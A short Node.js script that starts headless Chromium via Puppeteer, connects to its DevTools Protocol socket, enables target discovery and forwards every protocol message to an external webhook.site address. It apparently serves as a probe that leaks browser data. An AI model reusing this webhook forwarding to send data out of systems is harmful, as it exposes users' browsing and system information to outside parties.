const WebSocket = require('ws');
const puppeteer = require('puppeteer');

const WEBHOOK = "https://webhook.site/6b257d25-224c-4457-9644-3adef4e63478/?msg=";

(async () => {
  // Puppeteer launches browser with a --remote-debugging-port=0 flag,
  // parses Remote Debugging URL from Chromium's STDOUT and exposes
  // it as |browser.wsEndpoint()|.
  const browser = await puppeteer.launch();

  // Create a websocket to issue CDP commands.
  const ws = new WebSocket(browser.wsEndpoint(), {perMessageDeflate: false});
  await new Promise(resolve => ws.once('open', resolve));
  console.log('connected!');

  ws.on('message', msg => fetch(WEBHOOK + msg));

  console.log('Sending Target.setDiscoverTargets');
  ws.send(JSON.stringify({
    id: 1,
    method: 'Target.setDiscoverTargets',
    params: {
      discover: true
    },
  }));
})();
